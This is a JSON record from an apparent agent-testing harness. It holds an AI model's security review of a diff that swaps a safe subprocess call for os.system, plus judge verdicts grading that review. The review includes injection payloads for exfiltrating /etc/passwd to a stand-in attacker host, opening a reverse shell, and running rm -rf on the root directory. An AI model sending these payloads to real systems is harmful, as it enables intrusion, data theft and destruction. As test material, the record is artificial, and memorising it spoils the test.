@@ -1,0 +1,71 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 6,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review Findings\n\nI reviewed `diff-obfuscated-cmdi.patch`. There is **one critical vulnerability** introduced by this change.\n\n---\n\n### 🔴 CRITICAL — OS Command Injection (CWE-78)\n\n**File:** `src/media/thumbnail.py` (lines 12–14)\n\n**The change:**\n```python\n# BEFORE (safe)\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n\n# AFTER (vulnerable)\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n\n**Why it's dangerous**\n\nThe original code passed an **argument list directly to `subprocess.run` without a shell**. Arguments like `infile` and `size` were treated as literal, opaque strings — no shell metacharacter interpretation was possible.\n\nThe new code takes those same values, `\" \".join(...)`s them into a single string, and hands it to **`os.system()`, which executes it through `/bin/sh`**. Both `infile` and `size` are attacker-controlled:\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")   # user input\nsize   = request.GET.get(\"size\", \"100x100\")     # user input\n```\n\nAny shell metacharacter in these request parameters is now interpreted by the shell, giving an attacker arbitrary command execution as the web process user.\n\n**Proof-of-concept exploits**\n\n```\n# Read/exfiltrate secrets\n?src=x.png;curl%20http://attacker/$(cat%20/etc/passwd|base64)\n\n# Reverse shell\n?src=x.png;bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261\n\n# Destructive\n?src=x.png;rm%20-rf%20--no-preserve-root%20/\n\n# Injection via the size param instead\n?size=100x100;id>/tmp/pwned\n```\n\nEach request causes the shell to run `convert ...` **and** the injected command.\n\n**Failure scenario:** A GET request of `GET /thumbnail?src=x.png;id` results in the server executing `id` (or any command) via the shell — full remote code execution with no authentication or special conditions required.\n\n**Note — the `shlex` import is a decoy:** The diff adds `import shlex` but never uses it. This looks like an intent to sanitize (`shlex.quote`) that was never applied — do not let its presence give a false sense of safety.\n\n---\n\n### Remediation\n\n**Preferred fix — revert to the shell-free call.** There is no reason to use `os.system` here:\n\n```python\nsubprocess.run(\n    [\"convert\", infile, \"-resize\", size, outfile],\n    check=True,\n)\n```\n\n`subprocess.run` with a list and **no `shell=True`** passes arguments directly to `execve`, so shell metacharacters are inert.\n\n**Defense-in-depth (recommended in addition):**\n- **Validate `size`** against a strict pattern, e.g. `re.fullmatch(r\"\\d{1,4}x\\d{1,4}\", size)`, and reject otherwise.\n- **Validate/normalize `src`**: restrict to an allowlisted directory, resolve the path (`os.path.realpath`) and confirm it stays inside the intended base dir to prevent path traversal / arbitrary-file read (`?src=/etc/passwd`), which exists even with the safe `subprocess` call.\n- Consider prefixing filenames with `./` or using `--` where the tool supports it so a filename beginning with `-` can't be interpreted as a flag.\n\n**Rules to enforce going forward:**\n- Never build a command string and pass it to `os.system` / `subprocess` with `shell=True`. Always pass an argument **list** with `shell=False` (the default).\n- If a shell is genuinely unavoidable, quote every interpolated value with `shlex.quote()` — but prefer eliminating the shell entirely.\n\n---\n\n**Summary:** This diff regresses a previously-safe, shell-free subprocess call into a shell-interpreted `os.system` call fed with unsanitized request parameters — a textbook, directly-exploitable RCE. It should not be merged; revert to the `subprocess.run(list, ...)` form and add input validation.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T23:49:46.752Z",
+  "durationMs": 38211,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the diff's regression from a safe subprocess.run argument list to os.system(\" \".join(parts)), explained that user-controlled request.GET values (size/src) flow unsanitized into a shell-interpreted command, provided concrete exploit payloads, and gave appropriate remediation — matching the rubric's core requirement exactly.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the diff's regression from a safe subprocess.run argument list to os.system(\" \".join(parts)), explained that user-controlled request.GET values (size/src) flow unsanitized into a shell-interpreted command, provided concrete exploit payloads, and gave appropriate remediation — matching the rubric's core requirement exactly."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the OS command injection vulnerability, explaining that user-controlled `size` and `src` parameters are joined into a shell string via `\" \".join(parts)` and passed to `os.system()`, which executes through `/bin/sh` and allows shell metacharacter injection; it provided concrete PoC exploits and correct remediation (revert to `subprocess.run` with an argument list, no shell=True), matching the rubric's required finding.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the OS command injection vulnerability, explaining that user-controlled `size` and `src` parameters are joined into a shell string via `\" \".join(parts)` and passed to `os.system()`, which executes through `/bin/sh` and allows shell metacharacter injection; it provided concrete PoC exploits and correct remediation (revert to `subprocess.run` with an argument list, no shell=True), matching the rubric's required finding."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review Findings\n\nI reviewed `diff-obfuscated-cmdi.patch`. There is **one critical vulnerability** introduced by this change.\n\n---\n\n### 🔴 CRITICAL — OS Command Injection (CWE-78)\n\n**File:** `src/media/thumbnail.py` (lines 12–14)\n\n**The change:**\n```python\n# BEFORE (safe)\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n\n# AFTER (vulnerable)\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n\n**Why it's dangerous**\n\nThe original code passed an **argument list directly to `subprocess.run` without a shell**. Arguments like `infile` and `size` were treated as literal, opaque strings — no shell metacharacter interpretation was possible.\n\nThe new code takes those same values, `\" \".join(...)`s them into a single string, and hands it to **`os.system()`, which executes it through `/bin/sh`**. Both `infile` and `size` are attacker-controlled:\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")   # user input\nsize   = request.GET.get(\"size\", \"100x100\")     # user input\n```\n\nAny shell metacharacter in these request parameters is now interpreted by the shell, giving an attacker arbitrary command execution as the web process user.\n\n**Proof-of-concept exploits**\n\n```\n# Read/exfiltrate secrets\n?src=x.png;curl%20http://attacker/$(cat%20/etc/passwd|base64)\n\n# Reverse shell\n?src=x.png;bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261\n\n# Destructive\n?src=x.png;rm%20-rf%20--no-preserve-root%20/\n\n# Injection via the size param instead\n?size=100x100;id>/tmp/pwned\n```\n\nEach request causes the shell to run `convert ...` **and** the injected command.\n\n**Failure scenario:** A GET request of `GET /thumbnail?src=x.png;id` results in the server executing `id` (or any command) via the shell — full remote code execution with no authentication or special conditions required.\n\n**Note — the `shlex` import is a decoy:** The diff adds `import shlex` but never uses it. This looks like an intent to sanitize (`shlex.quote`) that was never applied — do not let its presence give a false sense of safety.\n\n---\n\n### Remediation\n\n**Preferred fix — revert to the shell-free call.** There is no reason to use `os.system` here:\n\n```python\nsubprocess.run(\n    [\"convert\", infile, \"-resize\", size, outfile],\n    check=True,\n)\n```\n\n`subprocess.run` with a list and **no `shell=True`** passes arguments directly to `execve`, so shell metacharacters are inert.\n\n**Defense-in-depth (recommended in addition):**\n- **Validate `size`** against a strict pattern, e.g. `re.fullmatch(r\"\\d{1,4}x\\d{1,4}\", size)`, and reject otherwise.\n- **Validate/normalize `src`**: restrict to an allowlisted directory, resolve the path (`os.path.realpath`) and confirm it stays inside the intended base dir to prevent path traversal / arbitrary-file read (`?src=/etc/passwd`), which exists even with the safe `subprocess` call.\n- Consider prefixing filenames with `./` or using `--` where the tool supports it so a filename beginning with `-` can't be interpreted as a flag.\n\n**Rules to enforce going forward:**\n- Never build a command string and pass it to `os.system` / `subprocess` with `shell=True`. Always pass an argument **list** with `shell=False` (the default).\n- If a shell is genuinely unavoidable, quote every interpolated value with `shlex.quote()` — but prefer eliminating the shell entirely.\n\n---\n\n**Summary:** This diff regresses a previously-safe, shell-free subprocess call into a shell-interpreted `os.system` call fed with unsanitized request parameters — a textbook, directly-exploitable RCE. It should not be merged; revert to the `subprocess.run(list, ...)` form and add input validation.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 4,
+    "output_tokens": 1717,
+    "model": "opus"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 2,
+    "total_cost_usd": 0.06506150000000001,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 546,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000611,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-opus-4-8": {
+        "inputTokens": 4,
+        "outputTokens": 1717,
+        "cacheReadInputTokens": 43011,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.06445050000000001,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
